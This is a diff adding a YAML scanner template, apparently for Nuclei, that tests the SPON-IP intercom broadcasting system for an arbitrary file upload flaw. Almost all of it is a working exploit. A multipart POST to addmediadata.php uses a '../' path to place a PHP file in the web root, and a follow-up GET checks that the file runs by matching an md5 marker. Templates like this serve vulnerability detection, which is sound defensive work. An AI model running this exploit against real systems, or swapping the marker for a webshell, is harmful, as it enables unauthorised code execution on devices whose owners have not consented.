@@ -1,0 +1,57 @@
+id: poc-yaml-spon-addmediadata-php-anyfile-upload
+info:
+  name: SPON-IP Network Intercom Broadcasting System Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/php/addmediadata.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828"
+    body: |-
+      --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+      Content-Disposition: form-data; name="fullpath"
+
+      ../
+      --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+      Content-Disposition: form-data; name="subpath"
+
+      /
+      --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: application/octet-stream
+
+      <?php echo md5({{t1}});?>
+      --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"file\":"
+          - ".php"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
